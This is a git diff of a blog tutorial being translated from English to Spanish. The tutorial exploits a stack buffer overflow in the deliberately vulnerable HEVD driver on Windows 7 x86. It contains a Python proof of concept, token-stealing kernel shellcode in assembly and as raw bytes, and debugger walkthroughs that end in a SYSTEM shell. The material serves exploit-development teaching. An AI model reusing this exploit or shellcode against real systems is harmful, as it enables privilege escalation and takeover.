+<p>Con eso, tenemos todo lo que necesitamos para comenzar Exploit Development.</p>
+<h1 id="explotación-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</h1>
+<p>Para facilitar las cosas, ¿por qué no empezar con una vulnerabilidad tradicional? Un &ldquo;buffer overflow&rdquo;. Para ser las cosas mas facil tambien vamos usar <code>python</code>. Sin embargo, tenga en cuenta que más adelante en esta serie vamos usar <code>C</code> y tal vez <code>C++</code>.</p>
+<h2 id="identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</h2>
+<p>Ya que tenemos símbolos ingeniería inversa será facil. Dentro <em>IrpDeviceIoCtlHandler</em> podemos ver el &ldquo;stack overflow&rdquo; puede ser activado a través de el codigo I/O <strong>0x222003</strong>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/code_7.png" alt="alt text"></p>
-<p>If we enter the function <em>BufferOverflowStackIoctlHandler</em>.</p>
+<p>Si entramos a la función <em>BufferOverflowStackIoctlHandler</em>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
-<p>We ultimately make a call to <em>TriggerBufferOverflowStack</em>.</p>
+<p>Hacemos una yamada a <em>TriggerBufferOverflowStack</em>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
-<p>Let&rsquo;s make a proof of concept (PoC) to see what happens when we enter this function, for this tutorial we will be using python.</p>
+<p>Hagamos nuestro prueba de concepto (PoC) para ver que pasa cuando entramos en esta función.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -237,14 +241,15 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>                           NULL)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>main()
-</span></span></code></pre></div><h2 id="understanding-bufferoverflowstackioctlhandler">Understanding BufferOverflowStackIoctlHandler</h2>
-<p>Let&rsquo;s set a breakpoint on <em>BufferOverflowStackIoctlHandler</em>.</p>
+</span></span></code></pre></div><h2 id="entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</h2>
+<p>Establecer una pausa en <em>BufferOverflowStackIoctlHandler</em>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bu_bof_func_7.png" alt="alt text"></p>
-<p>Let&rsquo;s try to see exactly what is passed into this function, we can start by dumping the stack frame.</p>
+<p>Intentemos ver qué se pasa a esta función, podemos empesar bajando el &ldquo;stack frame&rdquo;.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/stack_frame_7.png" alt="alt text"></p>
-<p>Looking at <em>BufferOverflowStackIoctlHandler</em> within Ghidra tells us these parameters are of type <em>_IRP</em> and <em>_IO_STACK_LOCATION</em> (we also previously saw this from the current stack frame in WinDbg)</p>
+<p>Mirando <em>BufferOverflowStackIoctlHandler</em> dentro Ghidra nos dice que estos parámetros son de tipo <em>_IRP</em> y <em>_IO_STACK_LOCATION</em> (también vimos esto en el &ldquo;stack frame&rdquo; con WinDbg).</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
-<p>However, we&rsquo;re only really using <em>param_2</em> of type <em>_IO_STACK_LOCATION</em>. We can find this structure layout using the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">MS Documentation however</a>, since it&rsquo;s rather large I&rsquo;ll only show the relevant portion below.</p>
+<p>Sin embargo, en realidad sólo estamos usando <em>param_2</em> de el tipo <em>_IO_STACK_LOCATION</em>.</p>
+<p>Podemos encontrar la definición de esta estructura usando la documentación de <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">MS</a>, sin embargo es largo, entonces solo lo relevante para nosotros esta enseñado.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_STACK_LOCATION {
 </span></span><span style="display:flex;"><span>  UCHAR                  MajorFunction;
 </span></span><span style="display:flex;"><span>  UCHAR                  MinorFunction;
@@ -265,13 +270,13 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>  PIO_COMPLETION_ROUTINE CompletionRoutine;
 </span></span><span style="display:flex;"><span>  PVOID                  Context;
 </span></span><span style="display:flex;"><span>} IO_STACK_LOCATION, <span style="color:#f92672">*</span>PIO_STACK_LOCATION;
-</span></span></code></pre></div><p>If we dump this in WinDbg we can see that <strong>(param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong> is the pointer to our buffer.</p>
+</span></span></code></pre></div><p>Si miramos esto en WinDbg, miramos que <strong>(param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong> es el puntero a nuestro porción de memoria (&ldquo;buffer&rdquo;).</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/type3inputbuffer_7.png" alt="alt text"></p>
-<p>So, when we enter <em>TriggerBufferOverflowStack</em> we rest assured that our input is being passed as <em>param_1</em>.</p>
-<h2 id="understanding-triggerbufferoverflowstack">Understanding TriggerBufferOverflowStack</h2>
-<p>Now that we understood <em>param_1</em> of <em>TriggerBufferOverflowStack</em> is infact our buffer exploitation seems rather easy.</p>
+<p>Entonces, cuando entramos a <em>TriggerBufferOverflowStack</em>, podemos estar seguros de que nuestra información esta pasado como <em>param_1</em>.</p>
+<h2 id="entendiendo-triggerbufferoverflowstack">Entendiendo TriggerBufferOverflowStack</h2>
+<p>Ahora que entendimos que <em>param_1</em> de <em>TriggerBufferOverflowStack</em> contiene nuestra memoria, la explotación parece fácil</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
-<p>All we need to do is send over 2060 bytes and we should have memory corruption! Let&rsquo;s update the PoC and send it!</p>
+<p>Simplemente tenemos que mandar mas de 2060 &ldquo;bytes&rdquo; y deberíamos tener curropción de la memoria! Agregar los cambios al PoC y mando lo!</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -310,12 +315,12 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>                           NULL)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>main()
-</span></span></code></pre></div><p>Once sent, we can see we have successfully overwritten the return address and we have gained control over the instruction pointer.</p>
+</span></span></code></pre></div><p>Una vez enviado, podemos ver que hemos sobrescrito una dirección que utiliza la computadora para regresar y hemos ganado control sobre el puntero de instrucción (EIP).</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eip_7.png" alt="alt text"></p>
 <h2 id="kernel-shellcode">Kernel Shellcode??</h2>
-<p>So, we got control over the instruction pointer, and we have a solid understanding of how. The question remains, how do we get code execution, or rather spawn a SYSTEM shell?</p>
-<p>We&rsquo;re gonna need shellcode, however we can&rsquo;t just use any shellcode. Since we&rsquo;re running under the context of the kernel one wrong move directly correlates to a blue screen of death (BSOD). To reach our goal, we&rsquo;re going to be using a technique known as <strong>Token Stealing</strong>. Using this technique, we&rsquo;ll be copying a token with SYSTEM privileges to our current process.</p>
-<p>Luckily for us HEVD comes with a few Payloads including this one. Let&rsquo;s take a look at it within <em>Payloads.c</em>.</p>
+<p>Entonces tenemos control sobre el puntero de las instrucciones, y tenemos un conocimiento sólido de cómo. Una pregunta falta, ¿cómo podemos manipular código para ejecutar? Es mas, cómo podemos crear un &ldquo;shell&rdquo; de &ldquo;SYSTEM&rdquo;?</p>
+<p>Vamos a necesitar shellcode, sin embargo, no podemos usar cualquier shellcode. Como estamos corriendo bajo el contexto de el Kernel, un paso equivocado resulta en una pantalla de muerte azul (BSOD). Para alcanzar nuestro objetivo, utilizaremos una técnica conocida como <strong>Token Stealing</strong>. Usando esta técnica, copiaremos un token con privilegios a nuestro proceso.</p>
+<p>Por suerte para nosotros, HEVD viene con copias de Payloads incluyendo este. Echemos una mirada a <em>Payloads.c</em> dentro del repositro.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">186</span> VOID <span style="color:#a6e22e">TokenStealingPayloadWin7Generic</span>() {
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>     <span style="color:#75715e">// No Need of Kernel Recovery as we are not corrupting anything
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">188</span>     <span style="color:#66d9ef">__asm</span> {
@@ -346,24 +351,25 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>         popad                                ; Restore registers state
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">214</span>     }
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">215</span> }
-</span></span></code></pre></div><p>Let&rsquo;s break this down line by line. On line <em>193</em> we clear out the EAX register. Next on line <em>193</em> we use the <em>FS</em> register to get the address of the current thread located at offset 0x124. We can see this within WinDbg.</p>
+</span></span></code></pre></div><p>Vamos a dividir esto línea por línea. En línea <em>192</em> borramos el registro EAX. Después, en línea <em>193</em> usamos el registro <em>FS</em> para obtener la dirección del &ldquo;current thread&rdquo; ubicado desde la distancia 0x124. Podemos ver esto con WinDbg:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/thread_7.png" alt="alt text"></p>
-<p>Let&rsquo;s map out the structure, first we need the base address of the <em>PCR (Processor Control Region)</em>, also known as the <em>_KPCR</em> from there we can easily traverse the structure and find the current thread.</p>
+<p>Vamos a mapear la estructura, primero necesitamos la dirección del el <em>PCR (Processor Control Region)</em>, también conocido como el <em>_KPCR</em> desde allí podemos fácilmente iterar sobre la estructura y encontrar el &ldquo;current thread&rdquo;.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/map_7.png" alt="alt text"></p>
-<p>Next, we need to find the address of the <em>_EPROCESS data structure (&ldquo;Executive Process&rdquo;)</em>. Each running process on a Windows system is associated with an EPROCESS structure. We can do this just like we did the _KCPR.</p>
+<p>Después, necesitamos encontrar la dirección de la estructura <em>_EPROCESS (&ldquo;Executive Process&rdquo;)</em>.</p>
+<p>Cada proceso en ejecución en un los systemas de Windows esta asociado con un estructura de EPROCESS. Podemos hacer esto tal como hicimos el _KCPR.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocess_7.png" alt="alt text"></p>
-<p>Now let&rsquo;s look at the next block of code within this Payload (Feel free to just follow along. At this point I began writing the shellcode stub):</p>
+<p>Ahora veamos el siguiente bloque de código dentro de este &ldquo;payload&rdquo; (aqi siéntete libre de nomas leer porque en este punto comencé a escribir el código para Sickle):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         SearchSystemPID:
 </span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">FLINK_OFFSET</span>]    <span style="color:#75715e">; Get nt!_EPROCESS.ActiveProcessLinks.Flink
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">FLINK_OFFSET</span>
 </span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">PID_OFFSET</span>], <span style="color:#66d9ef">edx</span>      <span style="color:#75715e">; Get nt!_EPROCESS.UniqueProcessId
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
-</span></span></code></pre></div><p>Here we&rsquo;re extracting the <em>forward link (FLINK) pointer</em> from the current <em>_EPROCESS structure</em>, then subtracting the offset to the FLINK from EAX to have EAX then point to the next _EPROCESS structure in the linked list. We then compare the process ID of the _EPROCESS structure to 0x04 and if it&rsquo;s not found we continue searching until we find a SYSTEM process.</p>
-<p>Once we find a process, we simply replace the current processes token. This is almost like an egghunter but for tokens.</p>
+</span></span></code></pre></div><p>Aquí estamos extractado el puntero al <em>forward link (FLINK) pointer</em> desde el *_EPROCESS&quot; corriente, luego restando la distancia al FLINK desde EAX para cambiar EAX para señalar el siguiente estructura _EPROCESS dentro del lista enlazada. Luego comparamos la identificación del proceso de la estructura _EPROCESS a 0x04 y si no se encuentra seguimos buscando hasta que encontramos el proceso de &ldquo;SYSTEM&rdquo;.</p>
+<p>Una vez que encontramos el proceso, simplemente reemplazamos nuestro token del proceso &ldquo;SYSTEM&rdquo;. Esto es casi como un cazador de huevos (&ldquo;egghunter&rdquo;) pero para los tokens.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>]        <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>], <span style="color:#66d9ef">edx</span>        <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                              <span style="color:#75715e">; with SYSTEM process nt!_EPROCESS.Token
-</span></span></span></code></pre></div><p>The full code can be seen below:</p>
+</span></span></span></code></pre></div><p>El código se puede ver aqi:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">32</span>      ]
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">SECTION</span> <span style="color:#66d9ef">.text</span>]
 </span></span><span style="display:flex;"><span>
@@ -371,23 +377,23 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>_start:
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pushad</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; set ZERO
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x124</span>]     <span style="color:#75715e">; nt!_KPCR.PcrbData.CurrentThread
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x50</span>]             <span style="color:#75715e">; nt!_KTHREAD.ApcState.Process
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; Copy current process _EPROCESS structure
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x04</span>                     <span style="color:#75715e">; WIN 10 SYSTEM PROCESS PID
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pushad</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; set ZERO
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x124</span>]     <span style="color:#75715e">; nt!_KPCR.PcrbData.CurrentThread
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x50</span>]             <span style="color:#75715e">; nt!_KTHREAD.ApcState.Process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; Copy current process _EPROCESS structure
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x04</span>                     <span style="color:#75715e">; WIN 10 SYSTEM PROCESS PID
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>	SearchSystemPID:
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb8</span>]         <span style="color:#75715e">; nt!_EPROCESS.ActiveProcessLinks.Flink
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xb8</span>
-</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb4</span>], <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; nt!_EPROCESS.UniqueProcessId
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
+</span></span><span style="display:flex;"><span>        SearchSystemPID:
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb8</span>]         <span style="color:#75715e">; nt!_EPROCESS.ActiveProcessLinks.Flink
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb4</span>], <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; nt!_EPROCESS.UniqueProcessId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>]             <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>], <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">popad</span>
-</span></span></code></pre></div><p>Let&rsquo;s look at this in the debugger, you can generate the shellcode using <em>Sickle</em>.</p>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>]             <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>], <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">popad</span>
+</span></span></code></pre></div><p>Veamos esto en el depurador (debugger), puedes generarlo usando <em>Sickle</em>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">()</span>
@@ -395,7 +401,7 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8&#39;</span>
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8&#39;</span>
 </span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61&#39;</span>
-</span></span></code></pre></div><p>Now let&rsquo;s update the PoC as shown below:</p>
+</span></span></code></pre></div><p>Realizar los cambios en el PoC como se demuestra aqi:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -462,28 +468,30 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>main()
-</span></span></code></pre></div><p>Since we&rsquo;re gonna be overwriting the return address, let&rsquo;s break at <strong>BASE+OFFSET</strong>. We can get this from Ghidra.</p>
+</span></span></code></pre></div><p>Como vamos a sobrescribir una dirección de regreso, hacer una pausa en <strong>BASE+DISTANCIA</strong>. Podemos obtener esto con Ghidra.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/ret_7.png" alt="alt text"></p>
-<p>Now let&rsquo;s apply this to WinDbg.</p>
+<p>Aplicar esto a WinDbg.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/offset-ret_7.png" alt="alt text"></p>
-<p>With the breakpoint set, let&rsquo;s launch our exploit on the target machine. Once the breakpoint is hit, we can see that we&rsquo;re about to return the allocated memory region and execute our shellcode (52 bytes).</p>
+<p>Con una pausa configurada, inicie el exploit a el &ldquo;target machine&rdquo;.</p>
+<p>Una vez que llegues a la pausa, podemos ver que estamos a punto de regresar a la región de memoria y ejecutar nuestro código / shellcode (52 &ldquo;bytes&rdquo;).</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bp1_7.png" alt="alt text"></p>
-<p>Let&rsquo;s step into this (<em>t</em>) until we hit <strong>mov edx, 0x04</strong>. Once here <em>ECX</em> and <em>EAX</em> should contain pointers to <em>_EPROCESS</em>.</p>
+<p>Entremos en esto (<em>t</em>) hasta que la veamos <strong>mov edx, 0x04</strong>. Aqi <em>ECX</em> y <em>EAX</em> debe contener direcciones a <em>_EPROCESS</em>.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocEAX.png" alt="alt text"></p>
-<p>The next instruction moves the FLINK pointer into EAX.</p>
+<p>La siguiente instrucción mueve el FLINK a dentro de EAX.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/flink_ptr_7.png" alt="alt text"></p>
-<p>Once done <strong>sub eax, 0xb8</strong> executes (since we&rsquo;re traversing active processes). This effectively positions eax to the start of the next _EPROCESS structure.</p>
+<p>Una vez ejecutado, <strong>sub eax, 0xb8</strong> se ejecuta (como estamos atravesando procesos activos).</p>
+<p>Esto efectivamente posiciona EAX a el comienzo de la proxima estructura _EPROCESS.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/next_eproc_7.png" alt="alt text"></p>
-<p>Let&rsquo;s set a breakpoint here and continue execution until the process <em>_EPROCESS.UniqueProcessId</em> is 0x04 (I did it raw so if we reboot it likely won&rsquo;t resolve). Once found we can see that the jump won&rsquo;t be executed!</p>
+<p>Establezcamos un punto de interrupción aqi y ate continuar la ejecución hasta el proceso <em>_EPROCESS.UniqueProcessId</em> es 0x04. Una vez encontrado podemos ver que el salto no se ejecutará!</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/npjmp.png" alt="alt text"></p>
-<p>Now the code simply copies the token into our current _EPROCESS structure! It appears I was wrong in the last couple of notes this can be found in the owning process!</p>
+<p>Ahora el código simplemente copia el token en nuestra estructura _EPROCESS! Parece que estaba equivocada en el último par de notas esto se puede encontrar en el proceso de propiedad.</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/owning_7.png" alt="alt text"></p>
-<p>So, the reality is we don&rsquo;t need to look too far once we have the current thread&hellip; I was confused but it makes total sense now. Below is screenshot to recap!</p>
+<p>Entonces la realidad es que no tenemos que mirar demasiado lejos una vez que tenemos el &ldquo;current thread&hellip;&rdquo; Estaba confundido pero ahora tiene sentido. Puedes ver esto aqi:</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/recap_7.png" alt="alt text"></p>
-<p>Now we can continue to execute our shellcode, but we get a segfault. Why?</p>
+<p>Ahora podemos continuar ejecutando nuestro shellcode, pero nos estrellamos, ¿por qué?</p>
 <p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/crash_7.png" alt="alt text"></p>
-<h2 id="fixing-the-crash">Fixing The Crash</h2>
-<p>Looking at the state of registers it appears EBP is still corrupted. However more importantly we never return, let&rsquo;s add a ret instruction to the shellcode and place a valid address into EBP and try again.</p>
+<h2 id="arreglando-el-choque">Arreglando el Choque</h2>
+<p>Mirando el estado de los registros aparece que EBP todavía está corrupto. Sin embargo, lo más importante es que nunca regresaremos. Agreguemos una instrucción &ldquo;ret&rdquo; a el shellcode y poner una dirección válida sobre EBP y intentar otra vez.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ python3 sickle.py -a x86 -m asm_shell -f c                                            
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ASM Shell loaded <span style="color:#66d9ef">for</span> x86 architecture
@@ -492,11 +500,11 @@ The operation completed successfully.
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5d&#34;</span> // pop ebp
 </span></span><span style="display:flex;"><span>sickle &gt; a ret
